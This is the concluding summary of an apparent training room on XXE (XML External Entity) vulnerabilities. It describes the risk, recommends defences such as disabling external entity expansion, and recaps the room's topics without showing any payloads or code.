XXEÂ (XMLÂ External Entities) attacks arise from improper handling of user-supplied input in web applications, particularly inÂ XMLÂ parsing. Attackers exploit vulnerableÂ XMLÂ processors to inject malicious external entities, leading to data exfiltration, server compromise, or denial of service.Â XXEÂ vulnerabilities can be prevented by disabling external entity expansion, validating user input, and using secureÂ XMLÂ parsing libraries. Additionally, implementing security best practices such as input validation, output encoding, and secure coding practices can significantly reduce the risk ofÂ XXEÂ attacks. Regular security audits, code reviews, and training on secure development practices are essential for identifying and mitigatingÂ XXEÂ vulnerabilities. By understanding the risks and taking proactive measures, developers and administrators can protect their web applications fromÂ XXEÂ attacks and ensure the security and integrity of their systems.

### Recap of Key Concepts Covered in the Room

In this training room, we've covered a comprehensive range of topics related toÂ XXEÂ (XMLÂ External Entity) vulnerabilities, which are critical in understanding how these vulnerabilities can impact web security. Here's a quick recap:

- **UnderstandingÂ XML**: We explored the basics ofÂ XMLÂ syntax and structure, including the use of DTDs and how they can be exploited.
- **XMLÂ Parsing Mechanisms**: We discussed differentÂ XMLÂ parsers and their configurations, emphasizing secure practices.
- **ExploitingÂ XXE**: Detailed steps were provided to exploitÂ XXEÂ vulnerabilities, ranging from basic data exfiltration to advanced techniques like Out-of-BandÂ XXE.
- **XXE+SSRF**: We explored the concept ofÂ SSRFÂ attacks viaÂ XXEÂ for Out-of-Band data exfiltration and how to scan internal networks using this attack.
- **Mitigation**: Strategies to preventÂ XXEÂ vulnerabilities were outlined, focusing on avoiding misconfigurations and reinforcing secure coding practices.


